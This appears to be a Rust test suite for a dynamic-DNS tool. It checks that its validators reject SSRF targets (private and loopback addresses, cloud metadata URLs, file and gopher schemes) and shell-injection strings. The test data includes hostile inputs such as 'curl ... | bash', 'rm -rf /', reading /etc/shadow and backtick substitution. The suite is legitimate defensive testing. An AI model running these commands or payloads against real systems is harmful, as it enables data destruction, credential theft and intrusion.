//! SSRF 与命令注入防护安全专项测试套件
//!
//! # 覆盖范围
//! 针对网络边界与外部进程调用的高危攻击面进行深度边界测试，
//! 确保 SSRF（服务端请求伪造、DNS 重绑定、云元数据越权）以及
//! Shell 命令注入（Unix/Windows 元字符逃逸、空字节截断、变量扩展）
//! 在系统边界得到 100% 确定性拦截与精准错误反馈。

use rddns::ip_fetcher::command::validate_command_str;
use rddns::util::net::validate_safe_url_endpoint;

#[test]
fn test_ssrf_comprehensive_protection() {
    // 1. 本地回环与私有 IPv4 测试用例
    let private_ipv4_cases = [
        "http://127.0.0.1",
        "http://127.0.0.1:8080/metrics",
        "http://127.1",
        "http://10.0.0.1/admin",
        "http://10.255.255.255/api",
        "http://172.16.0.1/internal",
        "http://172.31.255.255/",
        "http://192.168.0.1/",
        "http://192.168.1.254:9876",
        "http://0.0.0.0",
        "http://0.0.0.0:8000",
    ];
    for url in private_ipv4_cases {
        let res = validate_safe_url_endpoint(url);
        assert!(
            res.is_err(),
            "SSRF 私有 IPv4 用例应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }

    // 2. 云厂商元数据与链路本地地址测试用例 (AWS, GCP, 阿里云等 169.254.169.254)
    let cloud_metadata_cases = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254:80/computeMetadata/v1/",
        "http://169.254.1.1/internal",
        "http://169.254.254.254:8080/",
    ];
    for url in cloud_metadata_cases {
        let res = validate_safe_url_endpoint(url);
        assert!(
            res.is_err(),
            "SSRF 云元数据地址应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }

    // 3. IPv6 本地回环与私有网段
    let ipv6_cases = [
        "http://[::1]",
        "http://[::1]:8080/status",
        "http://[fc00::1]/api",
        "http://[fd12:3456:789a::1]:8080",
        "http://[fe80::1]/link-local",
    ];
    for url in ipv6_cases {
        let res = validate_safe_url_endpoint(url);
        assert!(
            res.is_err(),
            "SSRF 本地与私有 IPv6 应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }

    // 4. Localhost 及其子域名
    let localhost_cases = [
        "http://localhost",
        "http://localhost:3000",
        "http://api.localhost",
        "http://foo.bar.localhost/api",
    ];
    for url in localhost_cases {
        let res = validate_safe_url_endpoint(url);
        assert!(
            res.is_err(),
            "SSRF Localhost 域名应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }

    // 5. 凭据与 UserInfo 混淆用例
    let auth_confusion_cases = [
        "http://admin:pass@127.0.0.1:8080/",
        "http://attacker.com@127.0.0.1/",
        "http://root:secret@192.168.1.1/config",
    ];
    for url in auth_confusion_cases {
        let res = validate_safe_url_endpoint(url);
        assert!(
            res.is_err(),
            "带 UserInfo 混淆的私有地址应当被拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }

    // 6. 危险与非法协议方案 Schemes
    let illegal_schemes = [
        "file:///etc/passwd",
        "file:///C:/Windows/win.ini",
        "ftp://127.0.0.1:21/test",
        "gopher://127.0.0.1:6379/_flushall",
        "dict://127.0.0.1:11211/stat",
        "javascript:alert(1)",
        "data:text/html,<html>test</html>",
    ];
    for url in illegal_schemes {
        let res = validate_safe_url_endpoint(url);
        assert!(
            res.is_err(),
            "非 HTTP/HTTPS 协议方案应当被严格拦截: {}, 实际结果: {:?}",
            url,
            res
        );
    }

    // 7. 合法公网地址放行验证
    let valid_public_cases = [
        "https://api.ipify.org",
        "https://api.ipify.org:443",
        "http://icanhazip.com",
        "https://1.1.1.1",
        "https://8.8.8.8/dns-query",
    ];
    for url in valid_public_cases {
        let res = validate_safe_url_endpoint(url);
        assert!(
            res.is_ok(),
            "合法公网地址应当被允许访问: {}, 实际结果: {:?}",
            url,
            res
        );
    }
}

#[test]
fn test_command_injection_comprehensive_protection() {
    // 1. 管道与多命令分隔符注入
    let command_separators = [
        "curl http://example.com | bash",
        "echo 1.1.1.1 ; rm -rf /",
        "cat ip.txt & whoami",
        "ip route && rm -rf /",
        "ip route || calc.exe",
    ];
    for cmd in command_separators {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "管道与多命令拼接应当被严格拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 2. 输入输出重定向注入
    let redirects = [
        "cat < /etc/shadow",
        "echo 1.1.1.1 > /etc/resolv.conf",
        "ip addr >> /tmp/pwned",
    ];
    for cmd in redirects {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "重定向元字符应当被拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 3. 环境变量与参数扩展注入 (Unix $ 与 Windows %)
    let var_expansion = [
        "echo $PATH",
        "echo ${USER}",
        "echo %SYSTEMROOT%",
        "echo %TEMP%\\pwn.bat",
    ];
    for cmd in var_expansion {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "环境变量扩展元字符应当被拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 4. Windows 转义元字符与括号注入
    let windows_injection = [
        "dir^|whoami",
        "powershell^calc.exe",
        "powershell (Get-NetIPAddress)",
        "{whoami}",
        "curl http://1.1.1.1^(whoami^)",
    ];
    for cmd in windows_injection {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "Windows 转义元字符及括号应当被拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 5. 命令执行代换与反引号
    let subshell_cases = ["echo `id`", "cat `cat secret.txt`"];
    for cmd in subshell_cases {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "反引号命令代换应当被拦截: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 6. 控制字符与空字节截断注入
    let control_char_cases = [
        "curl 1.1.1.1\nwhoami",
        "curl 1.1.1.1\rwhoami",
        "ip route\0--malicious",
    ];
    for cmd in control_char_cases {
        let res = validate_command_str(cmd);
        assert!(
            res.is_err(),
            "控制字符与空字节应当被拦截: {:?}, 实际结果: {:?}",
            cmd,
            res
        );
    }

    // 7. 空命令与仅空白字符串
    assert!(validate_command_str("").is_err());
    assert!(validate_command_str("   ").is_err());
    assert!(validate_command_str("\t\r\n").is_err());

    // 8. 合法安全命令用例放行
    let valid_commands = [
        "curl -s -4 https://api.ipify.org",
        "ip -6 addr show eth0",
        "python get_ip.py --interface eth0",
        "C:\\tools\\my_ip_tool.exe --json",
        "/usr/local/bin/fetch-ip -v",
    ];
    for cmd in valid_commands {
        let res = validate_command_str(cmd);
        assert!(
            res.is_ok(),
            "合法独立命令应当被允许: {}, 实际结果: {:?}",
            cmd,
            res
        );
    }
}
